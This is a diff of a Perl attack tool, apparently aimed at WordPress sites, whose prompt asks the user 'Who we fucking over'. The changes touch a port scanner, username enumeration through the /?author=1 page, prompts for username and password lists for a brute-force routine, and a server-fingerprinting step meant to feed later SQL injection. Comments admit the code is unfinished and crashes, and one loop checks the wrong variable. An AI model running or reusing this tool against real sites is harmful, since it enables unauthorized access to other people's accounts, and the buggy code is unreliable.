@@ -41,7 +41,6 @@ system('clear');
 my @ports = qw(20 21 22 23 53 67 68 69 80 88 135 139 443 445);
 my @oports;
 my @content;
-my $sock;
 my $banner = << 'EOL';
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 .___/\          __  .__                  ____.                                                      __    __________._______________________   ___ ___
@@ -68,11 +67,11 @@ print "\n\n[*]Who we fucking over => ";
 print color('bold red');
 chomp(my $host = <STDIN>);
 print color('bold yellow');
-print "\n\n[*]Enter the path to the list of usernames => ";
+print "\n[*]Enter the path to the list of usernames => ";
 print color('bold red');
 chomp(my $usernames = <STDIN>);
 print color('bold yellow');
-print "\n\n[*]Enter the path to the list of passwords => ";
+print "\n[*]Enter the path to the list of passwords => ";
 print color('bold red');
 chomp(my $passwords = <STDIN>);
 #####################################
@@ -101,6 +100,7 @@ sub port_scanner {
   print "[*]Port scanning $host\n";
   print "++++++++++++++++++++++++++++++\n";
   print color('reset');
+  my $sock;
   #looks for ports in the array
   foreach my $port (@ports){
       if($sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port,Proto => 'tcp', Timeout => 1)){
@@ -160,8 +160,8 @@ sub user_find {
   my $user = $host . '/?author=1'; #the /?author=1 will lead to a public facing list of users
   my $req = HTTP::Request ->new(GET=>$user); #build a request to get page content
   my $userhunt = $bot->request($req)->content; #sends the request then decodes the content so it doesn't load a hash
-  if($userhunt =~/<title>([a-zA-Z\/][^>]+)<\/title>/){ #filtering for the username in the pages title
-    my $victim = $1; #grabs the content between the <title> tags
+  if($userhunt =~/author\/(.*?)\//){ #filtering for the username in the pages URL
+    my $victim = $1; #grabs the content after the /author
     print color('bold green');
     print "[*]Found user\n";
     print "[*] =>\t$victim \n";
@@ -231,33 +231,45 @@ sub brute_force {
 #Site mapping
 #looks for Files that use the GET parameter
 #Will work with the SQL Injection... eventually
+#Still being debugged
 sub site_map{
   print color('bold yellow');
   print "++++++++++++++++++++++++++++++++++\n";
   print "[*]Looking for pages with potential vulns\n";
   print "++++++++++++++++++++++++++++++++++\n";
   print color('reset');
-  my $buffer; #variable used to temporarily store socket requests
-  my @get; #array for pages that have GET parameters
   my $server = 0; #Used for testing the server type
-  $sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => '80' ,Proto => 'tcp', Timeout => 1);
-  my $send = "HEAD / HTTP/1.1\r\n";
-#
-#
-# Working on getting the request to send. All attempts have failed so far
-#
-#
-  my @buffer = split("\n",$buffer); #split the data in the $buffer variable by newline characters and saves it to an array
+  my @buf;
+  my $sock;
 
-  foreach (@buffer){
-    if(m/^Server:(.*)/i){
-      print "Web server is: $1 \n";
+  if($sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => 80 ,Proto => 'tcp', Timeout => 1)){
+    my $buffer; #variable used to temporarily store socket requests
+    $sock->send("HEAD / HTTP/1.1\r\n");
+    $sock->send("\r\n");
+    $sock->send("\r\n");
+    $sock->recv($buffer,2048) || die "Can't connect to $host $!";
+    $sock->close();
+    my @buffer = split("\n",$buffer);
+    push @buf,@buffer;
+
+  }
+  #Program dies around here
+
+  foreach my $buf (@buf){
+    if($_ =~ m/^Server:(.*)/i){
+      print color('bold green');
+      print "[*]Web server is: $1 \n";
       $server++
     }
+    else{
+      print color('bold red');
+      print "Unable to find the server type!\n";
+    }
   }
+
   if($server) {
-    foreach ("html", "htm", "php", "asp", "aspx", "txt") {
-      if(page("index"."$_")){
+    foreach ("html", "htm", "php", "asp", "aspx") {
+      if(page_find("index"."$_")){
         print "page: index $_ \n";
         foreach (@content){
           print "File: $2 \n" if(m/<a.*href=("|")([^"']+)("|')/);
@@ -266,22 +278,16 @@ sub site_map{
       }
     }
   }
-  #Nested function
-  sub page {
-    my $res = $bot -> get($host.":80"."/".$_[0]);
-    if ($res -> is_success){
+
+  sub page_find {
+    my $res = $bot -> get($host."/".$_[0]);
+    if ($res -> is_success && $res -> redirect_ok){
       @content = split(/\015?\012/,$res->content); #\015 = ^M \012 = ^J
       return $_[0];
     }
     return;
   }
-  END {
-    $sock->close() if $sock;
-  }
 }
-
-
-
 
 
 
